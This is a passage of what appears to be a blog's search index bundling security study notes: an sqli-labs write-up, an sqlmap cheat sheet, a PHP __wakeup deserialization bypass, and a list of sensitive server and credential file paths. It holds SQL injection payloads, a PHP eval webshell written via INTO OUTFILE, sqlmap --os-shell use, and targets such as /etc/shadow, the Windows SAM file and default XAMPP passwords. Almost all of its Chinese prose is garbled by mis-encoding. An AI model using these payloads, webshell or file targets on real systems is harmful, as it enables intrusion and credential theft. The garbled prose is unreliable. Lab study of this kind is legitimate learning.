ä¸Šä»€ä¹ˆæ‰ä¼šè¢«æ‰§è¡Œå‘¢ï¼Œé¦–å…ˆæ˜¯ä¸èƒ½æœ‰å¼•å·è¯­å¥ï¼Œå¦‚æœæœ‰è¦å°†å¼•å·å†…çš„å†…å®¹è½¬ç»™åå…­è¿›åˆ¶çš„ï¼Œå¦‚æœè¦åŠ selectï¼Œæˆ‘ä»¬éœ€è¦unionæ¥æ‹¼æ¥ï¼Œä½†æ˜¯åœ¨è¿™é¢˜ä¸­æ˜¯è¡Œä¸é€šçš„ï¼Œè¿™æ˜¯ä¸€ä¸ªè¯­æ³•é—®é¢˜ï¼Œï¼šæœ‰unionçš„æ—¶å€™ï¼Œorder byè¦ä»¥æœ€åä¸€ä¸ªunionä¸ºå‡†ï¼Œæ‰€ä»¥ order byå¿…é¡»æ”¾åœ¨æœ€åä¸€ä¸ªunionåé¢ï¼Œé‚£ä¹ˆæˆ‘ä»¬åªèƒ½æ¢ä¸€ç§ï¼Œé¦–å…ˆæˆ‘ä»¬å…ˆæ¥è€ƒæŸ¥ä¸€ä¸‹æ˜¯å¦å­˜åœ¨æ³¨å…¥ç‚¹â€”â€”æ ¹æ®æˆ‘ä»¬è¾“å…¥çš„è¯­å¥ï¼Œé¡µé¢å‘ç”Ÿå˜åŒ–æ„å»ºpayload:?sort=rand(true) ?sort=rand(false)rand()æ˜¯äº§ç”Ÿä¸€ä¸ªéšæœºæ•°ï¼Œä½†å…¶å®æˆ‘ä»¬è¿™é‡Œèµ‹äºˆäº†ä¸€ä¸ªtrueå’Œfalseï¼Œä»–é‡Œé¢çš„å€¼å°±ä¼šä¸ä¸€æ ·ï¼Œè€Œå¦‚æœé¡µé¢å‘ç”Ÿäº†æ”¹å˜ï¼Œå°±è¯´æ˜æˆ‘ä»¬çš„æ³¨å…¥å·²ç»ç”Ÿæ•ˆäº†ï¼Œå…¶å®è¿™é‡Œçš„æœ¬è´¨æ˜¯ï¼Œæµ‹è¯•è¿™é‡Œèƒ½ä½¿ç”¨çš„è¯­å¥éƒ½æœ‰å•¥ï¼Œæˆ‘ä»¬ä½¿ç”¨äº†rand(ï¼‰å‡½æ•°ï¼Œå‘ç°æ˜¯å¯ä»¥äº§ç”Ÿé¡µé¢å˜åŒ–çš„ï¼Œç„¶åé‡Œé¢çš„trueå’Œfalseå…¶å®ä»£è¡¨çš„æ˜¯1å’Œ0 rand()å‡½æ•°ï¼šRAND()å‡½æ•°è°ƒç”¨å¯ä»¥åœ¨0å’Œ1ä¹‹é—´äº§ç”Ÿä¸€ä¸ªéšæœºæ•°ï¼š é¦–å…ˆæ˜¯æŠ¥é”™æ³¨å…¥ï¼š?sort=(extractvalue(1,concat(â€˜~â€™,database())) //è¿™é‡Œè¿æ³¨é‡Šéƒ½ä¸ç”¨ï¼Œå› ä¸ºè¿™ä¸ªidåæ— å…¶ä»–è¯­å¥è¿™æ ·å­æ˜¯æˆåŠŸçš„ï¼Œä¸‹ä¸€ä¸ªè¯­å¥ï¼šå †å æ³¨å…¥ï¼Œç”±äºæ²¡æœ‰mysqli_multi_queryæ‰€ä»¥ä¸è¡Œæ¥ä¸‹æ¥æ˜¯æ—¶é—´ç›²æ³¨?sort =1 and if(substr((select database()),1,8)=0x7365637572697479),1,sleep(5)æœ‰æ•ˆæœï¼Œä½†æ˜¯æ—¶é—´å¾ˆé•¿ï¼Œæ‰€ä»¥æˆ‘å°±åœ¨æƒ³ä¸ºä»€ä¹ˆï¼Œ(æ³¨æ„ sleep æ˜¯å­˜åœ¨ä¸€ä¸ªæ»¡è¶³æ¡ä»¶çš„è¡Œå°±ä¼šå»¶è¿ŸæŒ‡å®šçš„æ—¶é—´ï¼Œæ¯”å¦‚sleep(5)ï¼Œä½†æ˜¯å®é™…ä¸ŠæŸ¥æ‰¾åˆ°ä¸¤ä¸ªæ»¡è¶³æ¡ä»¶çš„è¡Œï¼Œé‚£ä¹ˆå°±ä¼šå»¶è¿Ÿ10s,è¿™å…¶å®æ˜¯ä¸€ä¸ªéå¸¸é‡è¦çš„ä¿¡æ¯ï¼Œåœ¨çœŸå®çš„æ¸—é€æµ‹è¯•è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬æœ‰æ—¶å€™ä¸æ¸…æ¥šæ•´ä¸ªè¡¨çš„æƒ…å†µçš„è¯ï¼Œå¯ä»¥ç”¨è¿™æ ·çš„æ–¹å¼è¿›è¡Œåˆºæ¢ï¼Œæ¯”å¦‚è®¾ç½®æˆ sleep(0.001) çœ‹æœ€åå¤šå°‘ç§’æœ‰ç»“æœï¼Œæ¨æ–­è¡¨çš„è¡Œæ•°)åŸæ¥æ˜¯è¿™æ ·ï¼Œå‚è€ƒé“¾æ¥ï¼šhttps://blog.csdn.net/weixin_43536759/article/details/104882964è¿™é‡Œå†ä»‹ç»å¦å¤–ä¸€ç§æ—¶é—´ç›²æ³¨ï¼šbenchmarkï¼ˆa,md5(1))æ˜¯å¯¹æŸä¸ªè®¡ç®—ï¼ˆmd5)é‡å¤å¤š(a)æ¬¡ï¼Œä¸èƒ½ç²¾ç¡®æŒæ§å»¶è¿Ÿæ—¶é—´æ„å»ºpayloadï¼š?sort= (select if(substring(current,1,1)=CHAR(115),BENCHMARK(50000000,md5(â€˜1â€™)),null) from (select database() as current) as test) æ¥ä¸‹æ¥æ˜¯å¸ƒå°”ç›²æ³¨æ— ååº”procedure analyse æ³¨å…¥procredure analyseä¸­ æ”¯æŒä¸¤ä¸ªå‚æ•°ï¼šé‚£ä¹ˆæˆ‘ä»¬å°±æ¥æ„é€ è¯•è¯•ï¼Œåœ¨mysql8.0ä¸­å¥½åƒå·²ç»ç§»é™¤äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±è›®çœ‹ä¸€ä¸‹ï¼Œè¿™ä¸ªä¸»è¦æ˜¯ç”¨åœ¨oder by limitåé¢çš„ payloadSELECT field FROM user WHERE id &gt;0 ORDER BY id LIMIT 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);è¿™ä¸ªæ˜¯æ„å»ºçš„payload è€Œè¿™é‡Œæ·»åŠ é™¤äº†time-baseçš„è¯­å¥ å…¶ä»–å¥½åƒéƒ½ä¸å¤ªè¡Œ å­¦ä¹ é“¾æ¥ï¼šhttps://www.freebuf.com/articles/web/57528.html è¯•è¯•ä¸Šä¼ æ–‡ä»¶æ³¨å…¥ æ­£å¥½å¥½ä¹…æ²¡ç¢°äº†ï¼Œå¤ä¹ ä¸€ä¸‹ åœ¨ä¹‹å‰æˆ‘ä»¬æ˜¯é€šè¿‡æ„å»º union select â€œ?php @eval($_post[cmd]);?&gt;â€ into oufile ç›®æ ‡æ–‡ä»¶å¤¹ï¼ˆèƒ½è¢«PHPåœ¨ç½‘é¡µæ‰“å¼€çš„æ–‡ä»¶åœ°å€ï¼‰ç„¶åæ„é€ å®Œä»¥åæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨èœåˆ€è¿æ¥å°±è¡Œäº†ä¸‹é¢æˆ‘ä»¬åœ¨è¿™é‡Œè¯•ä¸€ä¸‹ï¼Œä¹Ÿæ˜¯å¯ä»¥çš„ ç¬¬å››åä¸ƒå…³ï¼šåŠ ä¸ªå•å¼•å·ç¬¬å››åå…«å…³ï¼šæ— æŠ¥é”™ï¼Œæ‰€ä»¥åªèƒ½ç”¨æ—¶é—´ç›²æ³¨ï¼Œæˆ–è€…å¸ƒå°”ç›²æ³¨ç¬¬å››åä¹å…³ï¼šåŒä¸Š ç¬¬äº”åå…³çœ‹åˆ°äº†mysql_multi-queryæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç”¨å †æ ˆæ³¨å…¥ï¼Œç›´æ¥æ‹¼æ¥å°±è¡Œï¼Œå†çœ‹åé¢ä¹Ÿæ— å•¥è¿‡æ»¤çš„ä¸œè¥¿ 51å…³ï¼šåŠ äº†ä¸ªå•å¼•å·52å…³ï¼šæ²¡æœ‰æŠ¥é”™ï¼Œä½†æ˜¯å¯ä»¥ç»§ç»­å †æ ˆæ³¨å…¥53å…³ï¼šå•å¼•å·æ— æŠ¥é”™ï¼Œå¯å †æ ˆæ³¨å…¥ï¼Œæ—¶é—´ï¼Œå¸ƒå°”å•¥çš„å°±ä¸è¯´äº† ç¬¬äº”åå››å…³åœ¨è¿™å…³å½“ä¸­ï¼Œä»–æ˜¯éœ€è¦æˆ‘ä»¬æœ€åæäº¤ä¸€ä¸ªkeyï¼Œå¹¶ä¸”è¿™ä¸ªkeyæ˜¯è—åœ¨ä¸€ä¸ªæ–°çš„åº“é‡Œé¢çš„ï¼Œå¹¶ä¸”è¿‡äº†åç§’é’Ÿåè¿™ä¸ªkeyå°±ä¼šåˆ·æ–°ï¼Œæˆ‘ä»¬çœ‹äº†ä¸€ä¸‹æºç ï¼Œå¯ä»¥å‘ç°ï¼Œ**next_tryy();**å°±ä»£è¡¨ç€æ—¶é—´ï¼Œéšæ„ä¿®æ”¹æ—¶é—´æ¬¡æ•°ä»–å…¶å®éœ€è¦ä¸¤ç§ä¼ è¾“æ–¹å¼POSTï¼šæäº¤keyGETï¼šè·å–idå¹¶ä¸”åœ¨KEYé‚£ä¸€æ æœ‰äº†è¿‡æ»¤ä½¿ç”¨äº†mysqli_real_escape_stringä»¥åŠaddslashesä¸¤ä¸ªå‡½æ•°è¿›è¡Œè¿‡æ»¤ä½†æ˜¯åœ¨idé‚£ä¸€æ é‡Œé¢å•¥ä¹Ÿæ²¡è¿‡æ»¤ï¼Œå¹¶ä¸”æ˜¯ä»¥å•å¼•å·è¿›è¡Œé—­åˆçš„ã€‚æ‰€ä»¥æˆ‘ä»¬å°±åœ¨idé‚£è¾¹è¿›è¡Œæ³¨å…¥æ€è€ƒï¼šå¦‚æœæˆ‘ä»¬æ²¡çœ‹æºä»£ç ï¼Œå¦‚ä½•çŸ¥é“å‘¢ï¼Ÿé¢˜ç›®é»„å­—å°±è¯´ input the idäº† è€Œä¸‹é¢çš„keyç°åœ¨åªæ˜¯åœ¨è¿·æƒ‘ä½ å“ˆå“ˆ å¥½çš„çŸ¥é“è¿™äº›å†æ¥çœ‹æºç  ä»–æ˜¯ä¸æŠ¥é”™çš„ï¼Œåœ¨æˆ‘ä»¬ç™»å½•å ä»–æ˜¯æœ‰è·³å‡ºä¸¤ä¸ªæ ï¼Œæ‰€ä»¥æˆ‘ä»¬è¯•ä¸€ä¸‹unionæ‹¼æ¥select æ³¨å…¥å…ˆç”¨order byæŸ¥è¯¢å­—æ®µæ•°ï¼Œç„¶åæ‰“ä¸€å¥—ç»„åˆæ‹³å°±å¯ä»¥äº†payloadï¼š?id=-1â€™union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=â€™challengesâ€™ â€“+æ¥ä¸‹æ¥å°±æ˜¯æ ¹æ®ä»–çš„åŠ¨æ€ç å»ç¼–å†™payloadå³å¯å¾€åçš„å…³å¡éƒ½æ˜¯å˜å½¢ï¼Œæ²¡å•¥å¥½è¯´çš„ã€‚ sqlilabsåšé¢˜å°ç»“ï¼š1.çŸ¥é“ä»–æ˜¯éœ€è¦è·å–ä»€ä¹ˆæ•°æ® æ˜¯?sort è¿˜æ˜¯?id2.åˆ¤æ–­æ˜¯å¦æœ‰æ³¨å…¥ç‚¹å¸¸è§é—­åˆå½¢å¼ï¼šâ€˜ â€™â€˜ â€œ â€™ï¼‰ â€˜â€™ï¼‰ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚åŸºäºæ­¤å˜å½¢ï¼Œå°±æ˜¯å•å¼•å·å’Œæ‹¬å·çš„ç»„åˆåˆ¤æ–­æ‰‹æ³•&amp; å’Œ| è¿˜æœ‰ rand()3.order byåæ³¨å…¥ è¿˜æ˜¯ç›´æ¥ whereåæ³¨å…¥4.åˆ¤æ–­è¦ä½¿ç”¨ä»€ä¹ˆæ³¨å…¥æ‰‹æ³•ï¼šæœ‰æŠ¥é”™â€”â€”æŠ¥é”™æ³¨å…¥unionå¯ç”¨â€”â€”è€ƒè™‘union æ‹¼æ¥selecté™¤æ­¤ä»¥å¤–â€”â€”è€ƒè™‘æ–‡ä»¶ä¸Šä¼ æ³¨å…¥ï¼ˆä¸€å¥è¯æœ¨é©¬ï¼‰ï¼Œæ—¶é—´ï¼Œå¸ƒå°”ç›²æ³¨æ˜¯å¦æœ‰gbkç¼–ç ï¼Œè€ƒè™‘å®½å­—èŠ‚æ³¨å…¥æ˜¯å¦æœ‰mysqli_multi_query è€ƒè™‘å †æ ˆæ³¨å…¥ 5.æ˜¯å¦æœ‰waféœ€è¦ç»•è¿‡ä¾‹å¦‚ç©ºæ ¼å¯ä»¥é‡‡å–%a0 è¿˜æœ‰and or å¤§å°å†™è”åˆä¹¦å†™ï¼Œæˆ–è€…é‡å¤ä¹¦å†™ï¼Œè¿‡æ»¤å•å¼•å·ï¼Œæ ¹æ®è¿‡æ»¤æ–¹å¼é€‰æ‹©æ‰‹æ®µï¼Œæ˜¯ç›´æ¥è½¬ä¹‰æ·»åŠ /è¿˜æ˜¯ç›´æ¥å»æ‰å˜æˆnullï¼Œåœ¨ä¹¦å†™selectçš„æ—¶å€™å¯ä»¥å°†æœ€åâ€™åº“åâ€™è½¬åŒ–ä¸ºåå…­è¿›åˆ¶è¿›è¡Œä¹¦å†™0x***ç±»ä¼¼6.ç„¶åè¿˜æœ‰å¾ˆå¤šè¦å­¦ï¼Œç»§ç»­åŠªåŠ›","link":"/2020/12/08/sqlilabs8/"},{"title":"sqlmapå­¦ä¹ ","text":"getç±»å‹ï¼š1.æŸ¥çœ‹æ˜¯å¦æœ‰æ³¨å…¥ç‚¹ï¼šsqlmap -u ç½‘å€ 2.å‡ºæ•°æ®åº“åï¼šsqlmap -u ç½‘å€ â€“dbs3.å‡ºæ•°æ®åº“çš„è¡¨åï¼šsqlmap -u ç½‘å€ -D security â€“tables4.å‡ºæ•°æ®åº“çš„åˆ—åï¼šsqlmap -u ç½‘å€ -D security -T users â€“columns5.å‡ºæ•°æ®ï¼šsqlmap -u -D security -T users -C id,password,username â€“dump aaa POSTç±»å‹ä½¿ç”¨burpæŠ“åŒ…ï¼Œå°†è¯·æ±‚å†…å®¹ä¿å­˜åœ¨txtæ–‡ä»¶ä¸­ï¼ˆæˆ–è€…ä½¿ç”¨-u ç½‘å€ â€“data â€˜dataâ€™æ¥ä»£æ›¿ï¼‰1.ä½¿ç”¨sqlmapæ£€æŸ¥æ˜¯å¦å­˜åœ¨æ³¨å…¥ç‚¹ï¼šsqlmap -r æ–‡æ¡£ä½ç½®2.ä½¿ç”¨sqlmapçˆ†åº“åï¼šsqlmap -r æ–‡æ¡£ä½ç½® â€“dbs è®¾ç½®çº¿ç¨‹è¿™é‡Œéœ€è¦å…ˆå»é…ç½®æ–‡ä»¶æ”¹ä¸€ä¸‹æœ€å¤§çº¿ç¨‹ç„¶åå†å‘½ä»¤çš„æœ€ååŠ ä¸Š â€“threads+æ•°å­— æŸ¥çœ‹å½“å‰ç”¨æˆ·ä»¥åŠæ˜¯å¦æ˜¯dbaç”¨æˆ·â€“current-user æŸ¥çœ‹ç”¨æˆ·â€“is-dba æŸ¥çœ‹æ˜¯å¦æ˜¯dbaâ€“hostname æŸ¥çœ‹ä¸»æœºåâ€“passwordæš´åŠ›ç ´è§£ç”¨æˆ·åå¯†ç  æšä¸¾dbmsçš„æƒé™â€“privileges â€“role çˆ¬å–urlï¼šâ€“crawl=numï¼ˆ1ï¼Œ2ï¼Œ3ï¼Œ4ï¼šè¦çˆ¬å–çš„æ·±åº¦ï¼‰ â€“os-shellhttps://mp.weixin.qq.com/s/f-iIm4u5CJo2niMgTor2EQ 1.å†™å…¥shellçš„å‰ærootæƒé™ï¼Œéœ€è¦å†™æ–‡ä»¶çš„æƒé™ select group_concat(user,0x3a,file_priv) from mysql.user;å‡ºç°Yï¼Œè¿™å°±ä»£è¡¨ä½ æœ‰æ–‡ä»¶æƒé™ï¼ŒNå°±æ˜¯æ²¡æœ‰ ä»¥ä¸‹çš„å°±å’Œåœ¨sqli-labsæ—¶å†™é©¬çš„æ¡ä»¶æ˜¯ä¸€æ ·çš„éœ€è¦çŸ¥é“ç»å¯¹è·¯å¾„ â€“os-shell sqlmapå„ç§è„šæœ¬ä½¿ç”¨è¯´æ˜ï¼šhttps://xz.aliyun.com/t/2746","link":"/2020/12/17/sqlmap%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99%E5%AD%A6%E4%B9%A0/"},{"title":"PHPåºåˆ—åŒ–ååºåˆ—åŒ–ä»¥åŠå…¶ä¸­çš„æ¼æ´ï¼ˆä¸€ï¼‰","text":"__wakeup()å‡½æ•°ç”¨æ³•__wakeup()æ˜¯ç”¨åœ¨ååºåˆ—åŒ–æ“ä½œä¸­ã€‚unserialize()ä¼šæ£€æŸ¥å­˜åœ¨ä¸€ä¸ª__wakeup()æ–¹æ³•ã€‚å¦‚æœå­˜åœ¨ï¼Œåˆ™å…ˆä¼šè°ƒç”¨__wakeup()æ–¹æ³•ã€‚ 123456789&lt;?phpclass A{ function __wakeup(){ echo 'Hello'; } }$c = new A();$d=unserialize('O:1:&quot;A&quot;:0:{}');?&gt; æœ€åé¡µé¢è¾“å‡ºäº†Helloã€‚åœ¨ååºåˆ—åŒ–çš„æ—¶å€™å­˜åœ¨__wakeup()å‡½æ•°ï¼Œæ‰€ä»¥æœ€åå°±ä¼šè¾“å‡ºHello__wakeup()å‡½æ•°æ¼æ´è¯´æ˜ 1234567891011121314&lt;?php class Student{ public $full_name = 'zhangsan'; public $score = 150; public $grades = array(); function __wakeup() { echo &quot;__wakeup is invoked&quot;; }}$s = new Student();var_dump(serialize($s));?&gt; æœ€åé¡µé¢ä¸Šè¾“å‡ºçš„å°±æ˜¯Studentå¯¹è±¡çš„ä¸€ä¸ªåºåˆ—åŒ–è¾“å‡ºï¼ŒO:7:&quot;Student&quot;:3:{s:9:&quot;full_name&quot;;s:8:&quot;zhangsan&quot;;s:5:&quot;score&quot;;i:150;s:6:&quot;grades&quot;;a:0:{}}ã€‚å…¶ä¸­åœ¨Stuedentç±»åé¢æœ‰ä¸€ä¸ªæ•°å­—3ï¼Œæ•´ä¸ª3è¡¨ç¤ºçš„å°±æ˜¯Studentç±»å­˜åœ¨3ä¸ªå±æ€§ã€‚__wakeup()æ¼æ´å°±æ˜¯ä¸æ•´ä¸ªå±æ€§ä¸ªæ•°å€¼æœ‰å…³ã€‚å½“åºåˆ—åŒ–å­—ç¬¦ä¸²è¡¨ç¤ºå¯¹è±¡å±æ€§ä¸ªæ•°çš„å€¼å¤§äºçœŸå®ä¸ªæ•°çš„å±æ€§æ—¶å°±ä¼šè·³è¿‡__wakeupçš„æ‰§è¡Œã€‚å½“æˆ‘ä»¬å°†ä¸Šè¿°çš„åºåˆ—åŒ–çš„å­—ç¬¦ä¸²ä¸­çš„å¯¹è±¡å±æ€§ä¿®æ”¹ä¸º5ï¼Œå˜ä¸ºO:7:&quot;Student&quot;:5:{s:9:&quot;full_name&quot;;s:8:&quot;zhangsan&quot;;s:5:&quot;score&quot;;i:150;s:6:&quot;grades&quot;;a:0:{}}ã€‚æœ€åæ‰§è¡Œè¿è¡Œçš„ä»£ç å¦‚ä¸‹ï¼š 123456789101112131415class Student{ public $full_name = 'zhangsan'; public $score = 150; public $grades = array(); function __wakeup() { echo &quot;__wakeup is invoked&quot;; } function __destruct() { var_dump($this); }}$s = new Student();$stu = unserialize('O:7:&quot;Student&quot;:5:{s:9:&quot;full_name&quot;;s:8:&quot;zhangsan&quot;;s:5:&quot;score&quot;;i:150;s:6:&quot;grades&quot;;a:0:{}}'); å¯ä»¥çœ‹åˆ°è¿™æ ·å°±æˆåŠŸåœ°ç»•è¿‡äº†__wakeup()å‡½æ•°ã€‚ å‚è€ƒ:https://blog.spoock.com/2016/11/03/php-wakeup/(è¿˜æ²¡å®Œç»“ï¼Œè®°å¾—è¡¥)","link":"/2021/02/22/wakeup-%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E%E4%BB%A5%E5%8F%8A%E5%AE%9E%E9%99%85%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"},{"title":"window&#x2F;linuxæ•æ„Ÿç›®å½•æ•´ç†","text":"0x01ã€é…ç½®æ–‡ä»¶æŸ¥æ‰¾æ–‡ä»¶å¦‚æœèƒ½å¤Ÿå‘½ä»¤æ‰§è¡Œï¼Œç›´æ¥ä½¿ç”¨æŸ¥æ‰¾å‘½ä»¤å§ã€‚ã€‚ã€‚ Linux ç›¸å…³ï¼š 12345# æŸ¥æ‰¾æ–‡ä»¶find / -name filename.ext# å…¨ç›˜æŸ¥æ‰¾å«æœ‰ flag çš„æ–‡ä»¶grep flag -r / Windows ç›¸å…³ï¼š 123456789# å…¨ç›˜æŸ¥æ‰¾æ–‡ä»¶ï¼Œä¸€å®šè¦åŠ ä¸€ä¸ªæ˜Ÿå·ï¼for /r c:\\ %i in (password.txt*) do @echo %ifor /r c:\\ %i in (*.ini) do @echo %i# æŸ¥æ‰¾ C ç›˜ä¸­åŒ…å« password å­—æ ·çš„æ–‡ä»¶ï¼Œä¸€å®šè¦åŒå¼•å·ï¼findstr /s /n &quot;password&quot; c:\\*# æŸ¥æ‰¾ pwd.txt ä¸­æ˜¯å¦åŒ…å« password å­—æ ·ï¼Œä¸€å®šè¦åŒå¼•å·ï¼find /N /I &quot;password&quot; pwd.txt å¸¸è§çš„é…ç½®æ–‡ä»¶å12345678910111213141516171819202122232425# apachehttpd.conf# MySQLmy.ini# è™šæ‹Ÿä¸»æœºé…ç½®httpd-vhosts.conf# IISmetabase.xmlapplicationHost.config# ssh/etc/ssh/sshd_config# nginx/etc/nginx/nginx.conf/etc/nginx/sites-enabled/default# PHPphp.ini# weblogic è¯»å¯†ç ./security/SerializedSystemIni.dat./config/config.xml Apache123456789101112# é…ç½®æ–‡ä»¶è·¯å¾„/etc/httpd/conf/httpd.conf# é»˜è®¤ç«™ç‚¹è·¯å¾„/var/www/html/# ubuntu ä¸‹é…ç½®æ–‡ä»¶/etc/apache2/apache2.conf# è®¿é—®æ—¥å¿—å’Œé”™è¯¯æ—¥å¿—/private/var/log/apache2/error_log/private/var/log/apache2/access_log IIS12# é…ç½®æ–‡ä»¶web.config MySQL123# é…ç½®æ–‡ä»¶/etc/my.cnf/etc/mysql/my.cnf phpMyAdmin12345# é…ç½®æ–‡ä»¶config.inc.php# é»˜è®¤è·¯å¾„/var/www/phpmyadmin/config.inc.php XAMPP å»ºç«™ç›¸å…³è·¯å¾„ 1234567891011121314151617181920212223242526272829303132333435363738394041424344# ç½‘ç«™é»˜è®¤è·¯å¾„xampp\\htdocs# Apache åŸºæœ¬é…ç½®xampp\\apache\\conf\\httpd.conf# Apache SSLxampp\\apache\\conf\\ssl.conf# Apache Perlï¼ˆä»…é™æ’ä»¶ï¼‰xampp\\apache\\conf\\perl.conf# Apache Tomcatï¼ˆä»…é™æ’ä»¶ï¼‰xampp\\apache\\conf\\java.conf# Apache Pythonï¼ˆä»…é™æ’ä»¶ï¼‰xampp\\apache\\conf\\python.conf# è™šæ‹Ÿä¸»æœºxampp/apache/conf/extra/httpd-vhosts.conf# PHPxampp\\php\\php.ini# æ•°æ®åº“é»˜è®¤è·¯å¾„xampp\\mysql\\data# MySQLxampp\\mysql\\bin\\my.ini # phpMyAdminxampp\\phpMyAdmin\\config.inc.php# FileZilla FTP æœåŠ¡å™¨xampp\\FileZilla# FTP\\FileZilla Server.xml Mercury # é‚®ä»¶æœåŠ¡å™¨åŸºæœ¬é…ç½®xampp\\MercuryMail\\MERCURY.INI # Sendmailxampp\\sendmail\\sendmail.ini é»˜è®¤å¯†ç  1234567891011121314# MySQLUser: root Password:ï¼ˆç©ºï¼‰# FileZilla FTPUser: newuser Password: wamppUser: anonymous Password: some@mail.net# MercuryPostmaster: postmaster (postmaster@localhost) Administrator: Admin (admin@localhost) TestUser: newuser Password: wampp # WEBDAVUser: wampp Password: xampp phpStudy å»ºç«™è¿˜è®°å¾—å‡ å¹´å‰ç”¨ phpStudy å»ºç«™ï¼Œè´¼è´¹åŠ²ï¼Œå¯èƒ½æ˜¯å½“æ—¶æŠ€æœ¯å¤ªå·®äº†ï¼Œç«¯å£å ç”¨ã€æ•°æ®åº“ç®¡ç†å•¥çš„éƒ½å¾ˆä¹±ï¼Œä»Šå¤©ï¼ˆ2019å¹´08æœˆ02æ—¥ï¼‰åœ¨ Windows ä¸Šåˆæ­äº†ä¸€æ¬¡ï¼Œå‘ç°å•¥é—®é¢˜ä¹Ÿæ²¡é‡åˆ°ï¼ŒæŠ€æœ¯ã€äº§å“çš„æ›´æ–°æ¢ä»£çœŸçš„å¤ªå¿«äº†ã€‚ ç°åœ¨è¿˜å‡ºäº†ä¸ª pro ç‰ˆæœ¬ï¼Œæ‰€ä»¥è·¯å¾„ä¹Ÿç›¸å¯¹çš„æœ‰äº†å˜åŒ–ï¼Œæœ¬æ–‡ä»¥ Pro ç‰ˆä¸ºä¾‹ï¼Œå¦‚æœæ˜¯æ™®é€šç‰ˆï¼Œå»æ‰ Pro å³å¯ã€‚ ç›¸å…³è·¯å¾„ 123456789# æ ¹ç›®å½•phpstudy\\WWWphpstudy_pro\\WWW# phpMyAdminphpstudy_pro\\WWW\\phpMyAdmin4.8.5# phpï¼šPro ç‰ˆæœ¬ï¼Œä»¥æ‰©å±•çš„æ–¹å¼æ¥æ˜¾ç¤ºæ’ä»¶ã€‚phpstudy_pro\\Extensions\\php\\php7.3.4nts\\php.ini Nginx1é…ç½®æ–‡ä»¶å­˜æ”¾ç›®å½•ï¼š/etc/nginx ä¸»é…ç½®æ–‡ä»¶ï¼š/etc/nginx/conf/nginx.conf ç®¡ç†è„šæœ¬ï¼š/usr/lib64/systemd/system/nginx.service æ¨¡å—ï¼š/usr/lisb64/nginx/modules åº”ç”¨ç¨‹åºï¼š/usr/sbin/nginx ç¨‹åºé»˜è®¤å­˜æ”¾ä½ç½®ï¼š/usr/share/nginx/html æ—¥å¿—é»˜è®¤å­˜æ”¾ä½ç½®ï¼š/var/log/nginx é…ç½®æ–‡ä»¶ç›®å½•ä¸ºï¼š/usr/local/nginx/conf/nginx.conf 0x03ã€æ•æ„Ÿæ–‡ä»¶æ¢é’ˆç­‰ä¿¡æ¯åœ¨ä½¿ç”¨ XAMPP/LAMPP/phpStudy/PHPnow å»ºç«™æ—¶ï¼Œå¯èƒ½ç•™ä¸‹æ¥ä¸€äº›æ¢é’ˆé¡µé¢ï¼Œå¯ä»¥æ‰¾åˆ°ä¸€äº›å¯ç”¨çš„ä¿¡æ¯ï¼Œæ¯”å¦‚ Document_Root ä»£è¡¨ç½‘ç«™æ ¹ç›®å½•ï¼Œsession.save_path å­˜æ”¾ Session ä¿¡æ¯ã€‚ 123456789101.phpl.phpp.phpu.phtz.phptest.phpinfo.phpceshi.phptanzhen.phpphpinfo.php Windows1234567891011121314151617# æŸ¥çœ‹ç³»ç»Ÿç‰ˆæœ¬c:\\boot.ini# IISé…ç½®æ–‡ä»¶c:\\windows\\system32\\inetsrv\\MetaBase.xml # å­˜å‚¨Windowsç³»ç»Ÿåˆæ¬¡å®‰è£…çš„å¯†ç c:\\windows\\repair\\sam # MySQLé…ç½®c:\\ProgramFiles\\mysql\\my.ini # MySQL rootå¯†ç c:\\ProgramFiles\\mysql\\data\\mysql\\user.MYD # php é…ç½®ä¿¡æ¯c:\\windows\\php.ini linuxBasic Linux Privilege Escalation 1234567891011121314151617181920# è´¦æˆ·ä¿¡æ¯/etc/passwd# è´¦æˆ·å¯†ç æ–‡ä»¶/etc/shadow# Apache2é»˜è®¤é…ç½®æ–‡ä»¶/usr/local/app/apache2/conf/httpd.conf# è™šæ‹Ÿç½‘ç«™é…ç½®/usr/local/app/apache2/conf/extra/httpd-vhost.conf# PHP é…ç½®æ–‡ä»¶/usr/local/app/php5/lib/php.ini# Apache é…ç½®æ–‡ä»¶/etc/httpd/conf/httpd.conf# MySQL é…ç½®æ–‡ä»¶/etc/my.conf 0x04ã€å¸¸è§ CMSDeDeCms1234567/member/templets/menulit.php/plus/paycenter/alipay/return_url.php/plus/paycenter/cbpayment/autoreceive.php/paycenter/nps/config_pay_nps.php/plus/task/dede-maketimehtml.php/plus/task/dede-optimize-table.php/plus/task/dede-upcache.php WordPress12/wp-admin/includes/file.php/wp-content/themes/baiaogu-seo/footer.php Ecshop1234567891011121314151617181920212223242526272829303132333435363738394041424344454647/api/cron.php/wap/goods.php/temp/compiled/ur_here.lbi.php/temp/compiled/pages.lbi.php/temp/compiled/user_transaction.dwt.php/temp/compiled/history.lbi.php/temp/compiled/page_footer.lbi.php/temp/compiled/goods.dwt.php/temp/compiled/user_clips.dwt.php/temp/compiled/goods_article.lbi.php/temp/compiled/comments_list.lbi.php/temp/compiled/recommend_promotion.lbi.php/temp/compiled/search.dwt.php/temp/compiled/category_tree.lbi.php/temp/compiled/user_passport.dwt.php/temp/compiled/promotion_info.lbi.php/temp/compiled/user_menu.lbi.php/temp/compiled/message.dwt.php/temp/compiled/admin/pagefooter.htm.php/temp/compiled/admin/page.htm.php/temp/compiled/admin/start.htm.php/temp/compiled/admin/goods_search.htm.php/temp/compiled/admin/index.htm.php/temp/compiled/admin/order_list.htm.php/temp/compiled/admin/menu.htm.php/temp/compiled/admin/login.htm.php/temp/compiled/admin/message.htm.php/temp/compiled/admin/goods_list.htm.php/temp/compiled/admin/pageheader.htm.php/temp/compiled/admin/top.htm.php/temp/compiled/top10.lbi.php/temp/compiled/member_info.lbi.php/temp/compiled/bought_goods.lbi.php/temp/compiled/goods_related.lbi.php/temp/compiled/page_header.lbi.php/temp/compiled/goods_script.html.php/temp/compiled/index.dwt.php/temp/compiled/goods_fittings.lbi.php/temp/compiled/myship.dwt.